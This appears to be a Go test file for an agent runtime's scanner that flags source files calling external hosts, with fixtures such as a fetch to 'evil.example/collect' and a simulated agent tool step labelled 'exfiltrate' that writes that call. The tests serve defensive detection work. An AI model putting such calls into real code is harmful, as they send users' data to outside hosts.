package agentruntime

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func writeNetworkFixture(t *testing.T, root, name, content string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(name))
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestScanWorkspaceNetworkHostsClean(t *testing.T) {
	root := t.TempDir()
	writeNetworkFixture(t, root, "package.json", `{"dependencies":{"express":"https://registry.npmjs.org/express/-/express-5.1.0.tgz"}}`)
	writeNetworkFixture(t, root, "pom.xml", `<repository><url>https://repo.maven.apache.org/maven2</url></repository>`)
	writeNetworkFixture(t, root, "app.js", `fetch("http://127.0.0.1:8080/health"); fetch('http://localhost:8080/ready');`)
	writeNetworkFixture(t, root, "go.mod", "module example\n\ngo 1.25\n")
	violations, err := ScanWorkspaceNetworkHosts(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(violations) != 0 {
		t.Fatalf("violations = %#v", violations)
	}
}

func TestScanWorkspaceNetworkHostsFlagsExternal(t *testing.T) {
	root := t.TempDir()
	writeNetworkFixture(t, root, "sender.js", `fetch("https://evil.example/collect"); fetch("https://evil.example/collect");`)
	writeNetworkFixture(t, root, "Service.java", `HttpClient.newHttpClient().send("http://203.0.113.7/hook");`)
	violations, err := ScanWorkspaceNetworkHosts(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(violations) != 2 {
		t.Fatalf("violations = %#v", violations)
	}
	joined := strings.Join(violations, "\n")
	if !strings.Contains(joined, "evil.example") || !strings.Contains(joined, "sender.js") {
		t.Fatalf("violations = %#v", violations)
	}
	if !strings.Contains(joined, "203.0.113.7") || !strings.Contains(joined, "Service.java") {
		t.Fatalf("violations = %#v", violations)
	}
}

func TestScanWorkspaceNetworkHostsSkipsNonSource(t *testing.T) {
	root := t.TempDir()
	writeNetworkFixture(t, root, ".opencode/tool-output/spill.json", `{"url":"https://evil.example/spill"}`)
	writeNetworkFixture(t, root, "node_modules/pkg/package.json", `{"repository":"https://evil.example/pkg"}`)
	writeNetworkFixture(t, root, ".git/objects/x", "https://evil.example/git")
	violations, err := ScanWorkspaceNetworkHosts(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(violations) != 0 {
		t.Fatalf("violations = %#v", violations)
	}
}

func TestPurposeBuiltRunAppendsNetworkViolations(t *testing.T) {
	workingDirectory := t.TempDir()
	relay := newFakeRelay(t, []fakeRelayStep{
		toolStep("exfiltrate", ToolWriteFile, map[string]any{"path": "sender.js", "content": `fetch("https://evil.example/collect")`}),
		{content: "DONE"},
	})
	defer relay.Close()
	runtime := &PurposeBuiltRuntime{Client: newTestRelayClient(t, relay.URL)}
	result, err := runtime.Run(t.Context(), TaskSpec{
		Goal: "test", WorkingDirectory: workingDirectory, AllowedTools: []Tool{ToolWriteFile},
		TurnCeiling: 3, Deadline: time.Now().Add(time.Second),
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Telemetry.Termination != TerminationCompleted {
		t.Fatalf("termination = %q", result.Telemetry.Termination)
	}
	found := false
	for _, violation := range result.Telemetry.PolicyViolations {
		if strings.Contains(violation, "evil.example") && strings.Contains(violation, "sender.js") {
			found = true
		}
	}
	if !found {
		t.Fatalf("policy violations = %#v", result.Telemetry.PolicyViolations)
	}
}

func TestAppendNetworkPolicyViolationsScanFailure(t *testing.T) {
	var telemetry Telemetry
	AppendNetworkPolicyViolations(&telemetry, filepath.Join(t.TempDir(), "does-not-exist"))
	if len(telemetry.PolicyViolations) != 1 || !strings.Contains(telemetry.PolicyViolations[0], "network policy scan failed") {
		t.Fatalf("policy violations = %#v", telemetry.PolicyViolations)
	}
}
